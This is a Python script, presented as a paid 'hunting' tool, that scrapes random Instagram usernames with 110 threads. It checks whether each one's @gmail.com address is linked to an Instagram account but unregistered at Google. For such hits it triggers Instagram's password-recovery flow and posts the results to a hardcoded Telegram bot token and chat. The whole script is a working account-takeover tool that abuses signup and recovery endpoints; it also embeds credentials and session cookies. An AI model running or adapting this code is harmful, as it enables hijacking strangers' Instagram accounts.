
import requests
import os
import time
from time import time
from hashlib import md5
from user_agent import generate_user_agent
from random import randrange
from threading import Thread
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as okk
from uuid import uuid5
        
os.system("clear")
######Sir#####
O = '\x1b[38;5;208m' #برتقالي
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
K = '\033[2;35m'
C1 = '\033[2;35m'
B = '\033[2;36m'#سمائي
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'  # ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] TeleGram  : {B} its_me_neon_o    |
|{Z}[+] Instagram  : {B}its_me_neon_o |

𝙋𝙖𝙞𝙙 𝙏𝙤𝙤𝙡 𝘽𝙮 - @𝐍𝐄𝐎𝐍

------------------------------
{B}
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━
     ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

                    V2                                        
    ''')
mj=0;yy='azertyuiopmlkjhgfdsqwxcvbn';ids=[]
bad,bad2,good,good2= 0,0,0,0
tok = "7125871097:AAHMtLzCBSwzgJORZqKHGX7hqeVlZLrPyx0"
iD = "-1002142275868"
os.system('clear')
print('\n')

def check(username): 	     
 	          	email = username
 	          	url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
 	          	head= {	
			 'Host': 'www.instagram.com',
			 'origin': 'https://www.instagram.com',
			 'referer': 'https://www.instagram.com/accounts/signup/email/',	
			 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
			 'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',}
 	          	data = {
		'email':email+"@gmail.com",
		}
 	          	re= requests.post(url,headers=head,data=data).text
 	          	if 'email_is_taken' in re:
 	          		print(X+f'Available IG : {email}@gmail.com')      				
 	          		tl,host=tll()
 	          		cookies = {
    '__Host-GAPS': host
  }
 	          		headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': str(generate_user_agent()),
  }
 	          		params = {
    'TL': tl,
  }
 	          		data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
 	          		response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
 	          		if '"gf.uar",1' in str(response.text):
 	          			headers2 = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
 	          			data2 = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+email+'"}',
    'ig_sig_key_version': '4',
};req = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers2,data=data2,)
 	          			try:
 	          				rest = req.json()['email']
 	          			except:
 	          				rest=''
 	          			hunt=(f"""
𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇
----------𓆩 TANJI X NEON 𓆪‏----------

Email : {email}@gmail.com\nRest : {rest}

Tg - @Haxk""")

 	          			print(F+hunt)
 	          			requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(hunt))
 	          							           	 	          				          
 	          		else:
 	          		 print(X+f'Un Gm : {email}@gmail.com')
						
 	          	else:	
 	          		print(R+f'Un IG : {email}@gmail.com') 
 
def cokadada():
    cokANDdata=requests.get('https://login.aol.com/account/create',headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0','accept-language': 'en-US,en;q=0.9',})
    AS=cokANDdata.cookies.get_dict()['AS']
    A1=cokANDdata.cookies.get_dict()['A1']
    A3=cokANDdata.cookies.get_dict()['A3']
    A1S=cokANDdata.cookies.get_dict()['A1S']
    specData=cokANDdata.text.split('''name="attrSetIndex">
        <input type="hidden" value="''')[1].split(f'" name="specData">')[0]
    specId=cokANDdata.text.split('''name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" value="''')[1].split(f'" name="specId">')[0]
    crumb=cokANDdata.text.split('''name="cacheStored">
        <input type="hidden" value="''')[1].split(f'" name="crumb">')[0]
    sessionIndex=cokANDdata.text.split('''"acrumb">
        <input type="hidden" value="''')[1].split(f'" name="sessionIndex">')[0]
    acrumb=cokANDdata.text.split('''name="crumb">
        <input type="hidden" value="''')[1].split(f'" name="acrumb">')[0]
    return AS,A1,A3,A1S,specData,specId,crumb,acrumb,sessionIndex
   
def tll():
  try:
    n1=''.join(cc(yy)for i in range(okk(6,9)))
    n2=''.join(cc(yy)for i in range(okk(3,9)))
    host=''.join(cc(yy)for i in range(okk(15,30)))
    cookies = {
      '__Host-GAPS': host,
  }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': str(generate_user_agent()),
  }
    data = {
    'f.req': '["AEThLlz4luDk2yFWsQRU_KlZsoYtu6wNeZxocOIcj1BG20WA078YKjPYBHlgL8qq82PZDts7UWS0jQ2QmOU-Fh9UrfhgvRXgjlgxmWn2VptjYAi-emfCuzIezrd4IbKkWLbdSPxnA_mTSmtNVuiqJU_VZfR-KE3MtZf8qft2oqLdafTBloXqbn65aQv_o_DuwIR7pG6MmB_g","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    return tl,host
  except Exception as e:
    tll()
ids=[]
def get_id():
  id=str(randrange(10000, 410737614))
  if id not in ids:
    ids.append(id)
    return id
  else:
    get_id()
def get_username():
  while True:
    try:
      id=get_id()
      csrftoken = md5(str(time()).encode()).hexdigest()
      headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'dpr': '0.8',
    'origin': 'https://www.instagram.com',
    'user-agent': generate_user_agent(),
    'x-csrftoken': csrftoken,
    }
      data = {
    '__spin_b': 'trunk',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+id+'","username":"0s9s"}',
    'server_timestamps': 'true',
    'doc_id': '7666785636679494',
}
      response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
      username=response['data']['user']['username']
      if "_" in username:
      	""
      else:
      	if len(username) >= 2:      		
      		check(username)
      	else:
      		""
	
    except:
      ""
for i in range(110):
  Thread(target=get_username).start()
  #Nawaz_mythic
